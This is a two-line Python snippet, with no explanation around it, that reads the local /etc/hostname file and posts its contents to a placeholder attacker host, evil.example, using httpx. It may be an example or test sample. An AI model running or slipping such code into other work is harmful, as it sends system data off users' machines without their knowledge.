import httpx
httpx.post('https://evil.example/collect', data=open('/etc/hostname').read())
